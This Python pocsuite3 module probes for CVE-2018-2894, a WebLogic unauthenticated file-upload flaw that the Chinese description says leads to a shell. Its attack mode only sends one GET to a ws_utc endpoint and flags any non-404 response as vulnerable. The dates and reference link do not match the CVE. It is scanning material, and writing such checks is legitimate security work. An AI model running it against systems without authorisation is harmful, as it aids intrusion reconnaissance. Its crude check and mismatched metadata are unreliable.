#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc
import requests

VUL=['CVE-2018-2894']
headers = {'user-agent': 'ceshi/0.0.1'}

def islive(url):
        
        r = requests.get(url, headers=headers)
        return r.status_code
    
class TestPOC(POCBase):
    name = 'OracleWeblogic_FileUpload_CVE-2018-2894'
    vulID = 'CVE-2018-2894'  
    author = ['debug']
    vulType = 'File Upload'
    version = '1.0'    # default version: 1.0
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    desc = '''
		   Oracle WebLogic（CVE-2018-2894）管理端Config.do、begin.do未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。
	       '''
    vulDate = '2017-12-15'
    createDate = '2017-12-15'
    updateDate = '2017-12-15'
    appName = 'Oracle Weblogic'
    appVersion = '12.1.3.0,12.2.1.2,12.2.1.3'
    appPowerLink = ''
    samples = ['']
    
    
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        url= self.url + '/ws_utc/resources/setting/options/general'
        r = requests.get(url, headers=headers)		
        # if r.status_code != 404 and 'Error 404--Not Found' in r.text:
        if r.status_code != 404:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + ' OracleWeblogic_FileUpload_CVE-2018-2894' + ' is exist!'
        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)

